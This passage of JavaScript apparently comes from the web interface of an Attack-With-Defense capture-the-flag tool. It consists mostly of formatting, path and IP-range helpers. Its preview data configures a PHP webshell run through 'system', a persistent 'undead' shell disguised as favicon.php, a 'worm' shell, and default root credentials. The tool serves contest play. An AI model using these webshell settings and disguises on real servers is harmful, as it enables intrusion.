      return "失败";
    case "running":
      return "执行中";
    case "warning":
      return "告警";
    case "stopped":
      return "已停止";
    case "incoming":
      return "入站";
    case "outgoing":
      return "出站";
    case "neutral":
    case "unknown":
      return "未知";
    default:
      return normalized || "未知";
  }
}

function statusChipHtml(status, label) {
  return `<span class="status-chip ${escapeHTML(statusChipClass(status))}">${escapeHTML(label || statusLabel(status))}</span>`;
}

function statusChipClass(status) {
  const normalized = String(status || "").toLowerCase();
  switch (normalized) {
    case "success":
    case "passed":
    case "done":
      return "success";
    case "error":
    case "failed":
      return "error";
    case "warning":
      return "warning";
    case "running":
      return "info";
    default:
      return "neutral";
  }
}

function formatSSHState(sshState) {
  if (!sshState?.connected) {
    return sshState?.host ? `未连接 ${sshState.username || "root"}@${sshState.host}:${sshState.port || "22"}` : "未连接";
  }
  return `已连接 ${sshState.username || "root"}@${sshState.host}:${sshState.port || "22"}`;
}

function formatDateTime(value) {
  if (!value) {
    return "-";
  }
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) {
    return String(value);
  }
  return date.toLocaleString("zh-CN", { hour12: false });
}

function formatBytes(value) {
  const size = Number(value || 0);
  if (size < 1024) {
    return `${size} B`;
  }
  if (size < 1024 * 1024) {
    return `${(size / 1024).toFixed(1)} KB`;
  }
  return `${(size / (1024 * 1024)).toFixed(1)} MB`;
}

function formatEndpoint(ip, port) {
  if (!ip) {
    return "-";
  }
  return port ? `${ip}:${port}` : ip;
}

function parsePositiveInt(value, fallbackValue) {
  const parsed = Number.parseInt(String(value || ""), 10);
  return Number.isFinite(parsed) && parsed > 0 ? parsed : fallbackValue;
}

function joinRemotePath(base, name) {
  const left = String(base || "/").replace(/\/+$/, "") || "/";
  const right = String(name || "").replace(/^\/+/, "");
  return left === "/" ? `/${right}` : `${left}/${right}`;
}

function parentRemotePath(path) {
  const value = String(path || "/");
  if (value === "/") {
    return "/";
  }
  const cleaned = value.replace(/\/+$/, "");
  const index = cleaned.lastIndexOf("/");
  return index <= 0 ? "/" : cleaned.slice(0, index);
}

function uniqueArray(items) {
  return Array.from(new Set(Array.isArray(items) ? items : []));
}

function escapeHTML(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/\"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function stripAnsi(value) {
  return String(value || "")
    .replace(/\u001b\][^\u0007\u001b]*(?:\u0007|\u001b\\)/g, "")
    .replace(/\u001b\[\?2004[hl]/g, "")
    .replace(/\u001b\[[0-?]*[ -/]*[@-~]/g, "")
    .replace(/\u001b[@-_]/g, "")
    .replace(/\r(?!\n)/g, "\n")
    .replace(/[\u0000-\u0008\u000b-\u001a\u001c-\u001f\u007f]/g, "");
}

function loadMD5Settings() {
  try {
    return JSON.parse(window.localStorage?.getItem("awd-c0iq:md5") || "{}");
  } catch (_) {
    return {};
  }
}

function saveMD5Settings(payload) {
  state.md5Settings = payload || {};
  try {
    window.localStorage?.setItem("awd-c0iq:md5", JSON.stringify(state.md5Settings));
  } catch (_) {
    // ignore localStorage errors
  }
}

function extractTargetFromLine(line) {
  const text = String(line || "").trim();
  if (!text) {
    return "-";
  }
  const match = text.match(/(\d+\.\d+\.\d+\.\d+)/);
  return match ? match[1] : text;
}

function expandTargetEntry(value) {
  const text = String(value || "").trim();
  const match = text.match(/^(\d+\.\d+\.\d+\.)(\d+)-(\d+)$/);
  if (!match) {
    return [text];
  }
  const prefix = match[1];
  const start = Number.parseInt(match[2], 10);
  const end = Number.parseInt(match[3], 10);
  if (!Number.isFinite(start) || !Number.isFinite(end) || start <= 0 || end <= 0 || start > 255 || end > 255) {
    return [text];
  }
  const min = Math.min(start, end);
  const max = Math.max(start, end);
  const rows = [];
  for (let index = min; index <= max; index += 1) {
    rows.push(`${prefix}${index}`);
  }
  return rows;
}

async function readFileAsBase64(file) {
  const buffer = await file.arrayBuffer();
  let binary = "";
  const bytes = new Uint8Array(buffer);
  for (let index = 0; index < bytes.length; index += 1) {
    binary += String.fromCharCode(bytes[index]);
  }
  return btoa(binary);
}

function startClock() {
  const tick = () => setText("clockValue", new Date().toLocaleTimeString("zh-CN", { hour12: false }));
  tick();
  window.setInterval(tick, 1000);
}

function seedPreviewData() {
  state.config = {
    ownIPs: "192.168.1.10",
    shell: { port: "80", pass: "b", path: "/", file: "shell.php", method: "POST", query: "a=system", payload: "raw", proxy: "" },
    ssh: { host: "192.168.1.10", port: "22", username: "root", password: "", path: "/var/www/html" },
    database: { host: "127.0.0.1", port: "3306", username: "root", password: "root", name: "ctf" },
    undeadHorse: { urlPass: "pass", pass: "pass", filename: "favicon.php" },
    wormShell: { urlPass: "pass", pass: "pass" }
  };
  state.configState = "预览数据";
  state.targets = ["192.168.1.10", "192.168.1.11"];
  state.aliveTargets = new Set(["192.168.1.10"]);
  state.operationRows = [{ target: "192.168.1.10", success: true, output: "www-data", message: "whoami", source: "preview" }];
  state.flagRows = [{ target: "192.168.1.10", flag: "flag{preview}", success: true, message: "preview", source: "preview" }];
  state.defenseRows = [{ action: "备份网站目录", target: "192.168.1.10", status: "done", message: "preview" }];
  syncInputsFromConfig();
  resetPayloadEditors();
}
